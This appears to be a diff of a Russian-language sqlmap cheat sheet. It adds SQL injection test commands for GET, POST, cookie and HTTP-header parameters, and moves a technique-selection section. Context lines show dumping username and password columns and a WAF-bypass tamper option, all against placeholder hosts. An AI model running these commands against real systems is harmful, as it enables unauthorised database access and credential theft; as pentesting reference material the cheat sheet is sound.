@@ -14,11 +14,30 @@
 > ```bash
 > sqlmap -u "http://example.com/index.php?id=1" -D target_db -T target_table -C username,password --dump
 
-
+_______________________________________________________________________________________________________________________________________
 
 GET-параметры
 > ```bash
 > sqlmap -u "http://example.com/index.php?id=1"
+
+POST-параметры
+> ```bash
+> sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"
+
+Cookie-параметры
+> ```bash
+> sqlmap -u "http://example.com/profile.php" --cookie="PHPSESSID=abcd1234"
+
+HTTP-заголовки (User-Agent, Referer, X-Forwarded-For и т. д.)
+> ```bash
+> sqlmap -u "http://example.com/" --headers="User-Agent: evil_payload"
+
+_______________________________________________________________________________________________________________________________________
+
+Определение типа инъекции
+> ```bash
+> sqlmap -u "http://example.com/index.php?id=1" --technique=U
+> Где U – Union-based, можно заменить на B (Boolean-based), T (Time-based) и т. д.
 
 POST-параметры
 > ```bash
@@ -37,12 +56,6 @@ HTTP-заголовки (User-Agent, Referer, X-Forwarded-For и т. д.)
 
 
 
-
-
-
-Определение типа инъекции
-sqlmap -u "http://example.com/index.php?id=1" --technique=U
-Где U – Union-based, можно заменить на B (Boolean-based), T (Time-based) и т. д.
 
 Обход WAF (Web Application Firewall)
 sqlmap -u "http://example.com/index.php?id=1" --tamper=space2comment
